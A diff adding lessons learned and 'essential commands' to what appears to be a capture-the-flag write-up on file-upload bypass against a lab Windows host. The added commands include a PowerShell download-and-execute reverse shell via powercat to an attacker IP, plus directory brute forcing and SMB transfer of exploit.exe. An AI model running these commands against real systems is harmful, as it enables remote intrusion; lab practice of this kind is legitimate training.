@@ -29,6 +29,7 @@
 ### I decided to bruteforce a valid extension for this file uploade forms :
 
 ![image](https://user-images.githubusercontent.com/123066149/220403441-8a066e40-36cd-4899-93ed-620cf87938ad.png)
+
 ![image](https://user-images.githubusercontent.com/123066149/220403611-c9f3b6cd-c12f-4c23-b15e-bc6e34d9c8b8.png)
 
 ### Load extension.txt i used hacktrycks to find the right extensions according to the type of server :
@@ -176,3 +177,20 @@ https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-pro
 ![8](https://user-images.githubusercontent.com/123066149/220464961-8763b403-3f63-45e6-bc86-b1b801f9e542.PNG)
 
 # ${{\color{purple}Points of Improvement}}\ $
+
+* Better perform the directory bruteforce
+* Redirect bruteforces into files, same as nmap
+* Use a wordlist to brute force the extensions of a file upload ( don't waste your time doing it by hand )
+* Don't get stuck in a shell that doesn't allow you to run binaries
+* Don't hesitate to try several POC to find the right RCE
+
+# ${{\color{purple}Essential commandes}}\ $
+
+``gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx,asp``
+
+``IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.16.5:80/powercat.ps1');powercat -c 10.10.16.5 -p 4444 -e cmd.exe``
+
+``/usr/bin/impacket-smbserver kali .``
+
+``copy \\10.10.16.5\kali\exploit.exe``
+
